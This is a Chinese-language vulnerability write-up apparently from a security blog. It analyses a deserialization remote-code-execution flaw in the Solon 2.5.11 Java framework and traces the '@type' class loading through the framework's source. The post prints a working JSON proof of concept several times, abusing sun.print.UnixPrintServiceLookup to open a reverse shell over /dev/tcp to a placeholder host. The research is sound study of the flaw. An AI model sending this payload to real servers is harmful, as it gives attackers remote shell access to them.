# Solonv2.5.11-RCE

  
  
&lt;!--more--&gt;  
## 0x00 环境搭建  
https://solon.noear.org/start/build.do?artifact=helloworld_jdk8&amp;project=maven&amp;javaVer=1.8  
pom.xml  
```xml  
&lt;groupId&gt;org.noear&lt;/groupId&gt;    
&lt;artifactId&gt;solon-parent&lt;/artifactId&gt;    
&lt;version&gt;2.5.11&lt;/version&gt;  
```  
## 0x01 漏洞复现  
漏洞触发条件很简单，只要有接收参数的任意路由。  
但必须是 Linux&amp;&amp;jdk 环境下启动  
POC  
```json  
{  
&#34;name&#34;: {    
	&#34;@type&#34;: &#34;sun.print.UnixPrintServiceLookup&#34;,   
	&#34;lpcFirstCom&#34;:[   
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;,  
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;  
		]  
	}  
}  
```  
## 0x02 漏洞分析  
solon 是如何处理 json 数据的参数绑定的呢？  
直接在这里下个断点看调用栈  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171549021.png)
在`org.noear.solon.core.handle.ActionExecuteHandlerDefault#executeHandle`这里调用执行了`mWrap.invokeByAspect(obj, args.toArray());`调用了自定义的`com.example.demo.DemoController#hello`方法，而在上面`buildArgs(ctx, obj, mWrap);`用来进行参数绑定  
跟进这个参数绑定的方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171552806.png)
`buildArgs`中会对接收到的数据进行`changeBody`处理  
当传入 JSON 数据时就会做一个 JSON 解析，得到一个 ONode 对象  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171553604.png)
回到`buildArgs`则是对 hello 路由方法的参数取得类型，并根据类型做相应的处理后续来到`this.changeValue`这里  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171555181.png)
跟入其中，有一些判断，检验是否有 hello 方法对应的参数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171556793.png)
继续跟进来到`toObject`方法中，一直跟进到`org.noear.snack.to.ObjectToer#analyse`方法，这里会对ONode 对象做一些特殊处理。  
这里有两个点，传入的 JSON 是`{&#34;name&#34;:&#34;world&#34;}`，所以正常流畅会走到字符串处理，`clz`的值为`java.lang.String`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171602637.png)
假如我们传入一个 Object 呢？  
`{&#34;name&#34;:{}}`  
会直接进入到`clz = getTypeByNode(ctx, o, clz);`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171605652.png)
跟进这里，在`org.noear.snack.to.ObjectToer#getTypeByNode`方法中，类型为`Object`时，会取其中键值为`@type`的值来进行一个类的加载  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171609106.png)
这里赋值一个类  
`{&#34;name&#34;:{&#34;@type&#34;:&#34;sun.print.UnixPrintServiceLookup&#34;}}`  
成功进行了类加载  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171615874.png)
继续看怎么处理这个 clz 的  
在一个`switch case`之后，会来到一个 Object 的处理位置，直接来到最后`analyseBean(ctx, o, rst, clz, type, genericInfo);`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171617317.png)
跟进查看，发现对上面获取到的`clz`进行了实例化  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171618673.png)
后续判断了传入的对象是否有对应属性的值，如果存在则会进行一个赋值  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171620811.png)
赋值这里关键是看目标类中有哪些属性，不同于 fastjson 这里赋值并不会调用对象的`setter`或`getter`方法  
这里目标类的获取首先是从缓存中获取，  
```java  
ClassWrap clzWrap = ClassWrap.get(clz);  
```  
跟进这里，在构造函数中会调用`scanAllFields(clz, map::containsKey, map::put);`对目标类进行一个扫描  
```java  
private void scanAllFields(Class&lt;?&gt; clz, Predicate&lt;String&gt; checker, BiConsumer&lt;String, FieldWrap&gt; consumer) {    
    if (clz == null) {    
        return;    
    }    
    
    for (Field f : clz.getDeclaredFields()) {    
        int mod = f.getModifiers();    
    
        if (!Modifier.isStatic(mod)    
                &amp;&amp; !Modifier.isTransient(mod)) {    
    
            if(_isMemberClass &amp;&amp; f.getName().equals(&#34;this$0&#34;)){    
                continue;    
            }    
    
            if (checker.test(f.getName()) == false) {    
                _recordable &amp;= Modifier.isFinal(mod);    
                consumer.accept(f.getName(), new FieldWrap(clz, f, Modifier.isFinal(mod)));    
            }    
        }    
    }    
    
    Class&lt;?&gt; sup = clz.getSuperclass();    
    if (sup != Object.class) {    
        scanAllFields(sup, checker, consumer);    
    }    
}  
```  
最终获取到的 Field 是目标类中的非静态变量  
继续看，是怎么对我们所创建的对象进行赋值的  
```java  
for (FieldWrap f : clzWrap.fieldAllWraps()) {    
    if (f.isDeserialize() == false) {    
        continue;    
    }    
    String fieldK = f.getName();    
    
    if (excNames != null &amp;&amp; excNames.contains(fieldK)) {    
        continue;    
    }    
    
    
    if (o.contains(fieldK)) {    
        Class fieldT = f.type;    
        Type fieldGt = f.genericType;    
    
        if (f.readonly) {    
            analyseBeanOfValue(fieldK, fieldT, fieldGt, ctx, o, f.getValue(rst), genericInfo);    
        } else {    
    
    
            Object val = analyseBeanOfValue(fieldK, fieldT, fieldGt, ctx, o, f.getValue(rst), genericInfo);    
    
            if (val == null) {    
                //null string 是否以 空字符处理    
                if (ctx.options.hasFeature(Feature.StringFieldInitEmpty) &amp;&amp; f.type == String.class) {    
                    val = &#34;&#34;;    
                }    
            }    
    
            f.setValue(rst, val, disSetter);    
        }    
    }    
}  
```  
给一个值，继续跟入  
```json  
{  
&#34;name&#34;: {    
	&#34;@type&#34;: &#34;sun.print.UnixPrintServiceLookup&#34;,   
	&#34;lpcFirstCom&#34;:[   
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;,  
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;  
		]  
	}  
}  
```  
进入`f.setValue(rst,val,disSetter)`，这里处理逻辑也很简单，有对应的`setter`则用对应的`setter`进行赋值，没有则使用反射进行赋值  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171637153.png)
这里并不能用`fastjson`的`payload`直接打，因为赋值的前提条件是目标对象必须要有对应的字段才可以。  
所以这里选择的是`sun.print.UnixPrintServiceLookup`这个类，最后RCE的地方  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412171641615.png)
[sun.print.UnixPrintServiceLookup利用](https://xz.aliyun.com/t/12818)  
所以最终 payload 就是  
```json  
{  
&#34;name&#34;: {    
	&#34;@type&#34;: &#34;sun.print.UnixPrintServiceLookup&#34;,   
	&#34;lpcFirstCom&#34;:[   
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;,  
		&#34;;sh -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1;&#34;  
		]  
	}  
}  
```  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/solonv2.5.11-rce/  

